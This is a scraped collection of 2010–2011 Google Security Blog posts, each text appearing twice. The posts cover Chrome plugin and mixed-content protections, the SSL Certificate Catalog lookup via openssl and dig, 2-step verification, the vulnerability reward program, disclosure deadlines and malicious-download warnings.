{"website": "Google-Security", "title": "\nChrome warns users of out-of-date browser plugins\n", "author": ["Posted by Panayiotis Mavrommatis and Noé Lutz, Google Security Team"], "link": "https://security.googleblog.com/2011/03/chrome-warns-users-of-out-of-date.html", "abstract": "                                Posted by Panayiotis Mavrommatis and Noé Lutz, Google Security Team   The new version of Google Chrome is not only  speedier and simpler  but it also improves user security by automatically disabling out-of-date, vulnerable browser plugins.  As browsers get better at auto-updating, out-of-date plugins are becoming the weakest link against malware attacks. Thousands of web sites are compromised every week, turning those sites into malware distribution vectors by actively exploiting out-of-date plugins that run in the browser. Simply visiting one of these sites is usually enough to get your computer infected.  Keeping all of your plugins up-to-date with the latest security fixes can be a hassle, so a while ago we started using our 20% time to develop a solution. The initial implementation was a Chrome extension called  &#8220;SecBrowsing,&#8221;  which kept track of the latest plugin versions and encouraged users to update accordingly. The extension helped us gather valuable knowledge about plugins, and we started working with the Chrome team to build the feature right inside the browser.  With the latest version of Chrome, users will be automatically warned about any out-of-date plugins. If you run into a page that requires a plugin that&#8217;s not current, it won&#8217;t run by default. Instead, you&#8217;ll see a message that will help you get the latest, most secure version of the plugin. An example of this message is below, and you can read more about the feature at the  Chromium blog .                                        Posted by Panayiotis Mavrommatis and Noé Lutz, Google Security TeamThe new version of Google Chrome is not only speedier and simpler but it also improves user security by automatically disabling out-of-date, vulnerable browser plugins.As browsers get better at auto-updating, out-of-date plugins are becoming the weakest link against malware attacks. Thousands of web sites are compromised every week, turning those sites into malware distribution vectors by actively exploiting out-of-date plugins that run in the browser. Simply visiting one of these sites is usually enough to get your computer infected.Keeping all of your plugins up-to-date with the latest security fixes can be a hassle, so a while ago we started using our 20% time to develop a solution. The initial implementation was a Chrome extension called “SecBrowsing,” which kept track of the latest plugin versions and encouraged users to update accordingly. The extension helped us gather valuable knowledge about plugins, and we started working with the Chrome team to build the feature right inside the browser.With the latest version of Chrome, users will be automatically warned about any out-of-date plugins. If you run into a page that requires a plugin that’s not current, it won’t run by default. Instead, you’ll see a message that will help you get the latest, most secure version of the plugin. An example of this message is below, and you can read more about the feature at the Chromium blog.     ", "date": "March 31, 2011"},
{"website": "Google-Security", "title": "\nTrying to end mixed scripting vulnerabilities\n", "author": ["Posted by Chris Evans and Tom Sepez, Google Chrome Security Team"], "link": "https://security.googleblog.com/2011/06/trying-to-end-mixed-scripting.html", "abstract": "                             Posted by Chris Evans and Tom Sepez, Google Chrome Security Team   A &#8220;mixed sc ripting&#8221; vulnerability is caused when a page served over HTTPS loads a script, CSS, or plug-in resource over HTTP. A man-in-the-middle attacker (such as someone on the same wireless network) can typically intercept the HTTP resource  load and gain full access to the website loading the resource. It&#8217;s often as bad as if the web page hadn&#8217;t used HTTPS at all.  A less severe but similar problem -- let&#8217;s call it a &#8220;mixed display&#8221; vulnerability -- is caused when a page served over HTTPS loads an image, iFrame, or font over HTTP. A man-in-the-middle attacker can again intercept the HTTP resource load but normally can only affect the appearance of the page.  Browsers have long used different indicators, modal dialogs, block options or even click-throughs to indicate these conditions to users. If a page on your website has a mixed scripting issue, Chromium will currently indicate it like this in the URL bar:       And for a mixed display issue:       If any of the HTTPS pages on your website show the cross-out red https, there are good reasons to investigate promptly:   Your website won&#8217;t work as well in other modern browsers (such as IE9 or FF4) due to click-throughs and ugly modal dialogs.  You may have a security vulnerability that could compromise the entire HTTPS connection.  As of the first Chromium 14 canary release (14.0.785.0), we are trialing blocking mixed scripting conditions by default. We&#8217;ll be carefully listening to feedback; please leave it on  this Chromium bug .  We also added an infobar that shows when a script is being blocked:        As a user, you can choose to reload the website without the block applied. Ideally, in the longer term, the infobar will not have the option for the user to bypass it. Our experience shows that some subset of users will attempt to &#8220;click through&#8221; even the scariest of warnings -- despite the hazards that can follow.   Tools that can help website owners  If Chromium&#8217;s UI shows any mixed content issues on your site, you can try to use a couple of our developer tools to locate the problem. A useful message is typically logged to the JavaScript console (Menu -&gt; Tools -&gt; JavaScript Console):        You can also reload the page with the &#8220;Network&#8221; tab active and look for requests that were issued over the http:// protocol. It&#8217;s worth noting that the entire origin is poisoned when mixed scripting occurs in it, so you&#8217;ll want to look at the console for all tabs that reference the indicated origin. To clear the error, all tabs that reference the poisoned origin need to be closed. For particularly tough cases where it&#8217;s not clear how the origin became poisoned, you can also  enable debugging to the command-line console  to see the relevant warning message.  The latest Chromium 13 dev channel build (13.0.782.10) has a command line flag:  --no-running-insecure-content . We recommend that website owners and advanced users run with this flag, so we can all help mop up errant sites. (We also have the flag  --no-displaying-insecure-content  for the less serious class of mixed content issues; there are no plans to block this by default in Chromium 14).  The Chromium 14 release will come with an inverse flag: --allow-running-insecure-content, as a convenience for users and admins who have internal applications without immediate fixes for these errors.  Thanks for helping us push website security forward as a community. Until this class of bug is stamped out, Chromium has your back.                                   Posted by Chris Evans and Tom Sepez, Google Chrome Security TeamA “mixed scripting” vulnerability is caused when a page served over HTTPS loads a script, CSS, or plug-in resource over HTTP. A man-in-the-middle attacker (such as someone on the same wireless network) can typically intercept the HTTP resource load and gain full access to the website loading the resource. It’s often as bad as if the web page hadn’t used HTTPS at all.A less severe but similar problem -- let’s call it a “mixed display” vulnerability -- is caused when a page served over HTTPS loads an image, iFrame, or font over HTTP. A man-in-the-middle attacker can again intercept the HTTP resource load but normally can only affect the appearance of the page.Browsers have long used different indicators, modal dialogs, block options or even click-throughs to indicate these conditions to users. If a page on your website has a mixed scripting issue, Chromium will currently indicate it like this in the URL bar:And for a mixed display issue:If any of the HTTPS pages on your website show the cross-out red https, there are good reasons to investigate promptly:Your website won’t work as well in other modern browsers (such as IE9 or FF4) due to click-throughs and ugly modal dialogs.You may have a security vulnerability that could compromise the entire HTTPS connection.As of the first Chromium 14 canary release (14.0.785.0), we are trialing blocking mixed scripting conditions by default. We’ll be carefully listening to feedback; please leave it on this Chromium bug.We also added an infobar that shows when a script is being blocked:As a user, you can choose to reload the website without the block applied. Ideally, in the longer term, the infobar will not have the option for the user to bypass it. Our experience shows that some subset of users will attempt to “click through” even the scariest of warnings -- despite the hazards that can follow.Tools that can help website ownersIf Chromium’s UI shows any mixed content issues on your site, you can try to use a couple of our developer tools to locate the problem. A useful message is typically logged to the JavaScript console (Menu -> Tools -> JavaScript Console):You can also reload the page with the “Network” tab active and look for requests that were issued over the http:// protocol. It’s worth noting that the entire origin is poisoned when mixed scripting occurs in it, so you’ll want to look at the console for all tabs that reference the indicated origin. To clear the error, all tabs that reference the poisoned origin need to be closed. For particularly tough cases where it’s not clear how the origin became poisoned, you can also enable debugging to the command-line console to see the relevant warning message.The latest Chromium 13 dev channel build (13.0.782.10) has a command line flag: --no-running-insecure-content. We recommend that website owners and advanced users run with this flag, so we can all help mop up errant sites. (We also have the flag --no-displaying-insecure-content for the less serious class of mixed content issues; there are no plans to block this by default in Chromium 14).The Chromium 14 release will come with an inverse flag: --allow-running-insecure-content, as a convenience for users and admins who have internal applications without immediate fixes for these errors.Thanks for helping us push website security forward as a community. Until this class of bug is stamped out, Chromium has your back.     ", "date": "June 16, 2011"},
{"website": "Google-Security", "title": "\nImproving SSL certificate security\n", "author": ["Posted by Ben Laurie, Google Security Team"], "link": "https://security.googleblog.com/2011/04/improving-ssl-certificate-security.html", "abstract": "                             Posted by Ben Laurie, Google Security Team     In the wake of the recent  Comodo fraud incident , there has been a great deal of speculation about how to improve the public key infrastructure, on which the security of the Internet rests. Unfortunately, this isn&#8217;t a problem that will be fixed overnight. Luckily, however, experts have long known about these issues and have been devising solutions for some time.    Given the current interest it seems like a good time to talk about two projects in which Google is engaged.    The first is the Google Certificate Catalog. Google&#8217;s web crawlers scan the web on a regular basis in order to provide our search and other services. In the process, we also keep a record of all the SSL certificates we see. The Google Certificate Catalog is a database of all of those certificates, published in DNS. So, for example, if you wanted to see what we think of  https://www.google.com/ &#8217;s certificate, you could do this:     $  openssl s_client -connect www.google.com:443 &lt; /dev/null | openssl x509 -outform DER | openssl sha1   depth=1 /C=ZA/O=Thawte Consulting (Pty) Ltd./CN=Thawte SGC CA  verify error:num=20:unable to get local issuer certificate  verify return:0  DONE  405062e5befde4af97e9382af16cc87c8fb7c4e2  $  dig +short 405062e5befde4af97e9382af16cc87c8fb7c4e2.certs.googlednstest.com TXT   \"14867 15062 74\"     In other words: take the SHA-1 hash of the certificate, represent it as a hexadecimal number, then look up a TXT record with that name in the  certs.googlednstest.com  domain. What you get back is a set of three numbers. The first number is the day that Google&#8217;s crawlers first saw that certificate, the second is the most recent day, and the third is the number of days we saw it in between.    In order for the hash of a certificate to appear in our database, it must satisfy some criteria:    It must be correctly signed (either by a CA or self-signed).   It must have the correct domain name &#8212; that is, one that matches the one we used to retrieve the certificate.   The basic idea is that if a certificate doesn&#8217;t appear in our database, despite being correctly signed by a well-known CA and having a matching domain name, then there may be something suspicious about that certificate. This endeavor owes much to the excellent  Perspectives  project, but it is a somewhat different approach.    Accessing the data manually is rather difficult and painful, so we&#8217;re thinking about how to add opt-in support to the Chrome browser. We hope other browsers will in time consider acting similarly.    The second initiative to discuss is the  DANE Working Group at the IETF . DANE stands for DNS-based Authentication of Named Entities. In short, the idea is to allow domain operators to publish information about SSL certificates used on their hosts. It should be possible, using DANE DNS records, to specify particular certificates which are valid, or CAs that are allowed to sign certificates for those hosts. So, once more, if a certificate is seen that isn&#8217;t consistent with the DANE records, it should be treated with suspicion. Related to the DANE effort is the individually contributed  CAA record , which predates the DANE WG and provides similar functionality.    One could rightly point out that both of these efforts rely on DNS, which is not secure. Luckily we&#8217;ve been working on that problem for even longer than this one, and a reasonable answer is DNSSEC, which enables publishing DNS records that are cryptographically protected against forgery and modification.    It will be some time before DNSSEC is deployed widely enough for DANE to be broadly useful, since DANE requires every domain to be able to use DNSSEC. However, work is on the way to use DNSSEC for the Certificate Catalog well before the entire DNSSEC infrastructure is ready. If we publish a key for the domain in which we publish the catalog, clients can simply incorporate this key as an interim measure until DNSSEC is properly deployed.    Improving the public key infrastructure of the web is a big task and one that&#8217;s going to require the cooperation of many parties to be widely effective. We hope these projects will help point us in the right direction.                                   Posted by Ben Laurie, Google Security Team  In the wake of the recent Comodo fraud incident, there has been a great deal of speculation about how to improve the public key infrastructure, on which the security of the Internet rests. Unfortunately, this isn’t a problem that will be fixed overnight. Luckily, however, experts have long known about these issues and have been devising solutions for some time.  Given the current interest it seems like a good time to talk about two projects in which Google is engaged.  The first is the Google Certificate Catalog. Google’s web crawlers scan the web on a regular basis in order to provide our search and other services. In the process, we also keep a record of all the SSL certificates we see. The Google Certificate Catalog is a database of all of those certificates, published in DNS. So, for example, if you wanted to see what we think of https://www.google.com/’s certificate, you could do this:  $ openssl s_client -connect www.google.com:443 < /dev/null | openssl x509 -outform DER | openssl sha1 depth=1 /C=ZA/O=Thawte Consulting (Pty) Ltd./CN=Thawte SGC CA verify error:num=20:unable to get local issuer certificate verify return:0 DONE 405062e5befde4af97e9382af16cc87c8fb7c4e2 $ dig +short 405062e5befde4af97e9382af16cc87c8fb7c4e2.certs.googlednstest.com TXT \"14867 15062 74\"  In other words: take the SHA-1 hash of the certificate, represent it as a hexadecimal number, then look up a TXT record with that name in the certs.googlednstest.com domain. What you get back is a set of three numbers. The first number is the day that Google’s crawlers first saw that certificate, the second is the most recent day, and the third is the number of days we saw it in between.  In order for the hash of a certificate to appear in our database, it must satisfy some criteria: It must be correctly signed (either by a CA or self-signed). It must have the correct domain name — that is, one that matches the one we used to retrieve the certificate. The basic idea is that if a certificate doesn’t appear in our database, despite being correctly signed by a well-known CA and having a matching domain name, then there may be something suspicious about that certificate. This endeavor owes much to the excellent Perspectives project, but it is a somewhat different approach.  Accessing the data manually is rather difficult and painful, so we’re thinking about how to add opt-in support to the Chrome browser. We hope other browsers will in time consider acting similarly.  The second initiative to discuss is the DANE Working Group at the IETF. DANE stands for DNS-based Authentication of Named Entities. In short, the idea is to allow domain operators to publish information about SSL certificates used on their hosts. It should be possible, using DANE DNS records, to specify particular certificates which are valid, or CAs that are allowed to sign certificates for those hosts. So, once more, if a certificate is seen that isn’t consistent with the DANE records, it should be treated with suspicion. Related to the DANE effort is the individually contributed CAA record, which predates the DANE WG and provides similar functionality.  One could rightly point out that both of these efforts rely on DNS, which is not secure. Luckily we’ve been working on that problem for even longer than this one, and a reasonable answer is DNSSEC, which enables publishing DNS records that are cryptographically protected against forgery and modification.  It will be some time before DNSSEC is deployed widely enough for DANE to be broadly useful, since DANE requires every domain to be able to use DNSSEC. However, work is on the way to use DNSSEC for the Certificate Catalog well before the entire DNSSEC infrastructure is ready. If we publish a key for the domain in which we publish the catalog, clients can simply incorporate this key as an interim measure until DNSSEC is properly deployed.  Improving the public key infrastructure of the web is a big task and one that’s going to require the cooperation of many parties to be widely effective. We hope these projects will help point us in the right direction.     ", "date": "April 1, 2011"},
{"website": "Google-Security", "title": "\nAdvanced sign-in security for your Google account\n", "author": ["Posted by Nishit Shah, Product Manager, Google Security"], "link": "https://security.googleblog.com/2011/02/advanced-sign-in-security-for-your.html", "abstract": "                             Posted by Nishit Shah, Product Manager, Google Security      (Cross-posted from the  Official Google Blog )     Has anyone you know ever lost control of an email account and inadvertently sent spam&#8212;or worse&#8212;to their friends and family? There are plenty of examples (like the classic  \"Mugged in London\" scam ) that demonstrate why it's important to take steps to help secure your activities online. Your Gmail account, your photos, your private documents&#8212;if you reuse the same password on multiple sites and one of those sites gets hacked, or your password is conned out of you directly through a phishing scam, it can be used to access some of your most closely-held information.    Most of us are used to entrusting our information to a password, but we know that some of you are looking for something stronger. As we announced to our Google Apps customers  a few months ago , we've developed an advanced opt-in security feature called  2-step verification  that makes your Google Account significantly more secure by helping to verify that you're the real owner of your account. Now it's time to offer the same advanced protection to all of our users.    2-step verification requires two independent factors for authentication, much like you might see on your banking website: your password, plus a code obtained using your phone. Over the next few days, you'll see a new link on your  Account Settings page  that looks like this:                    Take your time to carefully set up 2-step verification&#8212;we expect it may take up to 15 minutes to enroll. A user-friendly set-up wizard will guide you through the process, including setting up a backup phone and creating backup codes in case you lose access to your primary phone. Once you enable 2-step verification, you'll see an extra page that prompts you for a code when you sign in to your account. After entering your password, Google will call you with the code, send you an SMS message or give you the choice to generate the code for yourself using a mobile application on your Android, BlackBerry or iPhone device. The choice is up to you. When you enter this code after correctly submitting your password we'll have a pretty good idea that the person signing in is actually you.                  It's an extra step, but it's one that significantly improves the security of your Google Account because it requires the powerful combination of both something you  know &#8212;your username and password&#8212;and something that only you should  have &#8212;your phone. A hacker would need access to both of these factors to gain access to your account. If you like, you can always choose a \"Remember verification for this computer for 30 days\" option, and you won't need to re-enter a code for another 30 days. You can also set up one-time  application-specific passwords  to sign in to your account from non-browser based applications that are designed to only ask for a password, and cannot prompt for the code.    To learn more about 2-step verification and get started, visit our  Help Center . And for more about staying safe online, see our ongoing  security blog series  or visit  http://www.staysafeonline.org/ . Be safe!      Update    Dec 7, 2011 : Updated the screenshots in this post.                                      Posted by Nishit Shah, Product Manager, Google Security  (Cross-posted from the Official Google Blog)  Has anyone you know ever lost control of an email account and inadvertently sent spam—or worse—to their friends and family? There are plenty of examples (like the classic \"Mugged in London\" scam) that demonstrate why it's important to take steps to help secure your activities online. Your Gmail account, your photos, your private documents—if you reuse the same password on multiple sites and one of those sites gets hacked, or your password is conned out of you directly through a phishing scam, it can be used to access some of your most closely-held information.  Most of us are used to entrusting our information to a password, but we know that some of you are looking for something stronger. As we announced to our Google Apps customers a few months ago, we've developed an advanced opt-in security feature called 2-step verification that makes your Google Account significantly more secure by helping to verify that you're the real owner of your account. Now it's time to offer the same advanced protection to all of our users.  2-step verification requires two independent factors for authentication, much like you might see on your banking website: your password, plus a code obtained using your phone. Over the next few days, you'll see a new link on your Account Settings page that looks like this:        Take your time to carefully set up 2-step verification—we expect it may take up to 15 minutes to enroll. A user-friendly set-up wizard will guide you through the process, including setting up a backup phone and creating backup codes in case you lose access to your primary phone. Once you enable 2-step verification, you'll see an extra page that prompts you for a code when you sign in to your account. After entering your password, Google will call you with the code, send you an SMS message or give you the choice to generate the code for yourself using a mobile application on your Android, BlackBerry or iPhone device. The choice is up to you. When you enter this code after correctly submitting your password we'll have a pretty good idea that the person signing in is actually you.       It's an extra step, but it's one that significantly improves the security of your Google Account because it requires the powerful combination of both something you know—your username and password—and something that only you should have—your phone. A hacker would need access to both of these factors to gain access to your account. If you like, you can always choose a \"Remember verification for this computer for 30 days\" option, and you won't need to re-enter a code for another 30 days. You can also set up one-time application-specific passwords to sign in to your account from non-browser based applications that are designed to only ask for a password, and cannot prompt for the code.  To learn more about 2-step verification and get started, visit our Help Center. And for more about staying safe online, see our ongoing security blog series or visit http://www.staysafeonline.org/. Be safe!  Update Dec 7, 2011: Updated the screenshots in this post.      ", "date": "February 10, 2011"},
{"website": "Google-Security", "title": "\nQuick update on our vulnerability reward program\n", "author": ["Posted by Matt Moore, Michal Zalewski, Adam Mein, Chris Evans; Google Security Team"], "link": "https://security.googleblog.com/2010/11/quick-update-on-our-vulnerability.html", "abstract": "                             Posted by Matt Moore, Michal Zalewski, Adam Mein, Chris Evans; Google Security Team   About a week and a half ago we launched a new  web vulnerability reward program , and the response has been fantastic. We've received many high quality reports from across the globe. Our bug review committee has been working hard, and we&#8217;re pleased to say that so far we plan to award over $20,000 to various talented researchers. We'll update our 'Hall of Fame' page with relevant details over the next few days.  Based on what we've received over the past week, we've  clarified  a few things about the program &#8212; in particular, the types of issues and Google services that are in scope for a reward. The review committee has been somewhat generous this first week, and we&#8217;ve granted a number of awards for bugs of low severity, or that wouldn&#8217;t normally fall under the conditions we originally described. Please be sure to review our  original post  and  clarification  thoroughly before reporting a potential issue to us.                                   Posted by Matt Moore, Michal Zalewski, Adam Mein, Chris Evans; Google Security TeamAbout a week and a half ago we launched a new web vulnerability reward program, and the response has been fantastic. We've received many high quality reports from across the globe. Our bug review committee has been working hard, and we’re pleased to say that so far we plan to award over $20,000 to various talented researchers. We'll update our 'Hall of Fame' page with relevant details over the next few days.Based on what we've received over the past week, we've clarified a few things about the program — in particular, the types of issues and Google services that are in scope for a reward. The review committee has been somewhat generous this first week, and we’ve granted a number of awards for bugs of low severity, or that wouldn’t normally fall under the conditions we originally described. Please be sure to review our original post and clarification thoroughly before reporting a potential issue to us.     ", "date": "November 11, 2010"},
{"website": "Google-Security", "title": "\nRebooting Responsible Disclosure: a focus on protecting end users\n", "author": ["Posted by Chris Evans, Eric Grosse, Neel Mehta, Matt Moore, Tavis Ormandy, Julien Tinnes, Michal Zalewski; Google Security Team"], "link": "https://security.googleblog.com/2010/07/rebooting-responsible-disclosure-focus.html", "abstract": "                             Posted by Chris Evans, Eric Grosse, Neel Mehta, Matt Moore, Tavis Ormandy, Julien Tinnes, Michal Zalewski; Google Security Team    Vulnerability disclosure policies have become a hot topic in recent years. Security researchers generally practice &#8220;responsible disclosure&#8221;, which involves privately notifying affected software vendors of vulnerabilities. The vendors then typically address the vulnerability at some later date, and the researcher reveals full details publicly at or after this time.  A competing philosophy, \"full disclosure\", involves the researcher making full details of a vulnerability available to everybody simultaneously, giving no preferential treatment to any single party.  The argument for responsible disclosure goes briefly thus: by giving the vendor the chance to patch the vulnerability before details are public, end users of the affected software are not put at undue risk, and are safer. Conversely, the argument for full disclosure proceeds: because a given bug may be under active exploitation, full disclosure enables immediate preventative action, and pressures vendors for fast fixes. Speedy fixes, in turn, make users safer by reducing the number of vulnerabilities available to attackers at any given time.  Note that there's no particular consensus on which disclosure policy is safer for users. Although responsible disclosure is more common, we recommend this  2001 post by Bruce Schneier  as background reading on some of the advantages and disadvantages of both approaches.  So, is the current take on responsible disclosure working to best protect end users in 2010? Not in all cases, no. The emotionally loaded name suggests that it is the most responsible way to conduct vulnerability research - but if we define being responsible as doing whatever it best takes to make end users safer, we will find a disconnect. We&#8217;ve seen an increase in vendors invoking the principles of &#8220;responsible&#8221; disclosure to delay fixing vulnerabilities indefinitely, sometimes for years; in that timeframe, these flaws are often rediscovered and used by rogue parties using the same tools and methodologies used by ethical researchers. The important implication of referring to this process as \"responsible\" is that researchers who do not comply are seen as behaving improperly. However, the inverse situation is often true: it can be irresponsible to permit a flaw to remain live for such an extended period of time.  Skilled attackers are using 0-day vulnerabilities in the wild, and there are increasing instances of:   0-day attacks that rely on vulnerabilities known to the vendor for a long while.    Situations where it became clear that a vulnerability was being actively exploited in the wild, subsequent to the bug being fixed or disclosed.  Accordingly, we believe that responsible disclosure is a two-way street. Vendors, as well as researchers, must act responsibly. Serious bugs should be fixed within a reasonable timescale. Whilst every bug is unique, we would suggest that 60 days is a reasonable upper bound for a genuinely critical issue in widely deployed software. This time scale is only meant to apply to critical issues. Some bugs are mischaracterized as &#8220;critical\", but we look to established guidelines to help make these important distinctions &#8212; e.g.  Chromium severity guidelines  and  Mozilla severity ratings .  As software engineers, we understand the pain of trying to fix, test and release a product rapidly; this especially applies to widely-deployed and complicated client software. Recognizing this, we put a lot of effort into keeping our release processes agile so that security fixes can be pushed out to users as quickly as possible.  A lot of talented security researchers work at Google. These researchers discover many vulnerabilities in products from vendors across the board, and they share a detailed analysis of their findings with vendors to help them get started on patch development. We will be supportive of the following practices by our researchers:   Placing a disclosure deadline on any serious vulnerability they report, consistent with complexity of the fix. (For example, a design error needs more time to address than a simple memory corruption bug).    Responding to a missed disclosure deadline or refusal to address the problem by publishing an analysis of the vulnerability, along with any suggested workarounds.    Setting an aggressive disclosure deadline where there exists evidence that blackhats already have knowledge of a given bug.  We of course expect to be held to the same standards ourselves. We recognize that we&#8217;ve handled bug reports in the past where we&#8217;ve been unable to meet reasonable publication deadlines -- due to unexpected dependencies, code complexity, or even simple mix-ups. In other instances, we&#8217;ve simply disagreed with a researcher on the scope or severity of a bug. In all these above cases, we&#8217;ve been happy for publication to proceed, and grateful for the heads-up.  We would invite other researchers to join us in using the proposed disclosure deadlines to drive faster security response efforts. Creating pressure towards more reasonably-timed fixes will result in smaller windows of opportunity for blackhats to abuse vulnerabilities. In our opinion, this small tweak to the rules of engagement will result in greater overall safety for users of the Internet.   Update September 10, 2010:  We'd like to clarify a few of the points above about how we approach the issue of vulnerability disclosure. While we believe vendors have an obligation to be responsive, the 60 day period before public notification about critical bugs is not intended to be a punishment for unresponsive vendors. We understand that not all bugs can be fixed in 60 days, although many can and should be. Rather, we thought of 60 days when considering how large the window of exposure for a critical vulnerability should be permitted to grow before users are best served by hearing enough details to make a decision about implementing possible mitigations, such as disabling a service, restricting access, setting a killbit, or contacting the vendor for more information. In most cases, we don't feel it's in people's best interest to be kept in the dark about critical vulnerabilities affecting their software for any longer period.                                   Posted by Chris Evans, Eric Grosse, Neel Mehta, Matt Moore, Tavis Ormandy, Julien Tinnes, Michal Zalewski; Google Security TeamVulnerability disclosure policies have become a hot topic in recent years. Security researchers generally practice “responsible disclosure”, which involves privately notifying affected software vendors of vulnerabilities. The vendors then typically address the vulnerability at some later date, and the researcher reveals full details publicly at or after this time.A competing philosophy, \"full disclosure\", involves the researcher making full details of a vulnerability available to everybody simultaneously, giving no preferential treatment to any single party.The argument for responsible disclosure goes briefly thus: by giving the vendor the chance to patch the vulnerability before details are public, end users of the affected software are not put at undue risk, and are safer. Conversely, the argument for full disclosure proceeds: because a given bug may be under active exploitation, full disclosure enables immediate preventative action, and pressures vendors for fast fixes. Speedy fixes, in turn, make users safer by reducing the number of vulnerabilities available to attackers at any given time.Note that there's no particular consensus on which disclosure policy is safer for users. Although responsible disclosure is more common, we recommend this 2001 post by Bruce Schneier as background reading on some of the advantages and disadvantages of both approaches.So, is the current take on responsible disclosure working to best protect end users in 2010? Not in all cases, no. The emotionally loaded name suggests that it is the most responsible way to conduct vulnerability research - but if we define being responsible as doing whatever it best takes to make end users safer, we will find a disconnect. We’ve seen an increase in vendors invoking the principles of “responsible” disclosure to delay fixing vulnerabilities indefinitely, sometimes for years; in that timeframe, these flaws are often rediscovered and used by rogue parties using the same tools and methodologies used by ethical researchers. The important implication of referring to this process as \"responsible\" is that researchers who do not comply are seen as behaving improperly. However, the inverse situation is often true: it can be irresponsible to permit a flaw to remain live for such an extended period of time.Skilled attackers are using 0-day vulnerabilities in the wild, and there are increasing instances of:0-day attacks that rely on vulnerabilities known to the vendor for a long while.Situations where it became clear that a vulnerability was being actively exploited in the wild, subsequent to the bug being fixed or disclosed.Accordingly, we believe that responsible disclosure is a two-way street. Vendors, as well as researchers, must act responsibly. Serious bugs should be fixed within a reasonable timescale. Whilst every bug is unique, we would suggest that 60 days is a reasonable upper bound for a genuinely critical issue in widely deployed software. This time scale is only meant to apply to critical issues. Some bugs are mischaracterized as “critical\", but we look to established guidelines to help make these important distinctions — e.g. Chromium severity guidelines and Mozilla severity ratings.As software engineers, we understand the pain of trying to fix, test and release a product rapidly; this especially applies to widely-deployed and complicated client software. Recognizing this, we put a lot of effort into keeping our release processes agile so that security fixes can be pushed out to users as quickly as possible.A lot of talented security researchers work at Google. These researchers discover many vulnerabilities in products from vendors across the board, and they share a detailed analysis of their findings with vendors to help them get started on patch development. We will be supportive of the following practices by our researchers:Placing a disclosure deadline on any serious vulnerability they report, consistent with complexity of the fix. (For example, a design error needs more time to address than a simple memory corruption bug).Responding to a missed disclosure deadline or refusal to address the problem by publishing an analysis of the vulnerability, along with any suggested workarounds.Setting an aggressive disclosure deadline where there exists evidence that blackhats already have knowledge of a given bug.We of course expect to be held to the same standards ourselves. We recognize that we’ve handled bug reports in the past where we’ve been unable to meet reasonable publication deadlines -- due to unexpected dependencies, code complexity, or even simple mix-ups. In other instances, we’ve simply disagreed with a researcher on the scope or severity of a bug. In all these above cases, we’ve been happy for publication to proceed, and grateful for the heads-up.We would invite other researchers to join us in using the proposed disclosure deadlines to drive faster security response efforts. Creating pressure towards more reasonably-timed fixes will result in smaller windows of opportunity for blackhats to abuse vulnerabilities. In our opinion, this small tweak to the rules of engagement will result in greater overall safety for users of the Internet.Update September 10, 2010: We'd like to clarify a few of the points above about how we approach the issue of vulnerability disclosure. While we believe vendors have an obligation to be responsive, the 60 day period before public notification about critical bugs is not intended to be a punishment for unresponsive vendors. We understand that not all bugs can be fixed in 60 days, although many can and should be. Rather, we thought of 60 days when considering how large the window of exposure for a critical vulnerability should be permitted to grow before users are best served by hearing enough details to make a decision about implementing possible mitigations, such as disabling a service, restricting access, setting a killbit, or contacting the vendor for more information. In most cases, we don't feel it's in people's best interest to be kept in the dark about critical vulnerabilities affecting their software for any longer period.     ", "date": "July 20, 2010"},
{"website": "Google-Security", "title": "\nProtecting users from malicious downloads\n", "author": ["Posted by Moheeb Abu Rajab, Google Security Team"], "link": "https://security.googleblog.com/2011/04/protecting-users-from-malicious.html", "abstract": "                             Posted by Moheeb Abu Rajab, Google Security Team      For the past five years Google has been offering protection to users against websites that attempt to distribute malware via drive-by downloads &#8212; that is, infections that harm users&#8217; computers when they simply visit a vulnerable site. The data produced by our systems and published via the  Safe Browsing API  is used by Google search and browsers such as Google Chrome, Firefox, and Safari to warn users who may attempt to visit these dangerous webpages.     Safe Browsing has done a lot of good for the web, yet the Internet remains rife with deceptive and harmful content. It&#8217;s easy to find sites hosting free downloads that promise one thing but actually behave quite differently. These downloads may even perform actions without the user&#8217;s consent, such as displaying spam ads, performing click fraud, or stealing other users&#8217; passwords. Such sites usually don&#8217;t attempt to exploit vulnerabilities on the user&#8217;s computer system. Instead, they use social engineering to entice users to download and run the malicious content.       Today we&#8217;re pleased to announce a new feature that aims to protect users against these kinds of downloads, starting with malicious Windows executables. The new feature will be integrated with Google Chrome and will display a warning if a user attempts to download a suspected malicious executable file:           Download warning      This warning will be displayed for any download URL that matches the latest list of malicious websites published by the  Safe Browsing API . The new feature follows the same  privacy policy  currently in use by the Safe Browsing feature. For example, this feature does not enable Google to determine the URLs you are visiting.    We&#8217;re starting with a small-scale experimental phase for a subset of our users who subscribe to the Chrome development release channel, and we hope to make this feature available to all users in the next stable release of Google Chrome. We hope that the feature will improve our users&#8217; online experience and help make the Internet a safer place.    For webmasters, you can continue to use the same interface provided by  Google Webmaster Tools  to learn about malware issues with your sites. These tools include binaries that have been identified by this new feature, and the same  review process  will apply.                                   Posted by Moheeb Abu Rajab, Google Security Team   For the past five years Google has been offering protection to users against websites that attempt to distribute malware via drive-by downloads — that is, infections that harm users’ computers when they simply visit a vulnerable site. The data produced by our systems and published via the Safe Browsing API is used by Google search and browsers such as Google Chrome, Firefox, and Safari to warn users who may attempt to visit these dangerous webpages.   Safe Browsing has done a lot of good for the web, yet the Internet remains rife with deceptive and harmful content. It’s easy to find sites hosting free downloads that promise one thing but actually behave quite differently. These downloads may even perform actions without the user’s consent, such as displaying spam ads, performing click fraud, or stealing other users’ passwords. Such sites usually don’t attempt to exploit vulnerabilities on the user’s computer system. Instead, they use social engineering to entice users to download and run the malicious content.     Today we’re pleased to announce a new feature that aims to protect users against these kinds of downloads, starting with malicious Windows executables. The new feature will be integrated with Google Chrome and will display a warning if a user attempts to download a suspected malicious executable file:  Download warning  This warning will be displayed for any download URL that matches the latest list of malicious websites published by the Safe Browsing API. The new feature follows the same privacy policy currently in use by the Safe Browsing feature. For example, this feature does not enable Google to determine the URLs you are visiting.  We’re starting with a small-scale experimental phase for a subset of our users who subscribe to the Chrome development release channel, and we hope to make this feature available to all users in the next stable release of Google Chrome. We hope that the feature will improve our users’ online experience and help make the Internet a safer place.  For webmasters, you can continue to use the same interface provided by Google Webmaster Tools to learn about malware issues with your sites. These tools include binaries that have been identified by this new feature, and the same review process will apply.     ", "date": "April 5, 2011"},
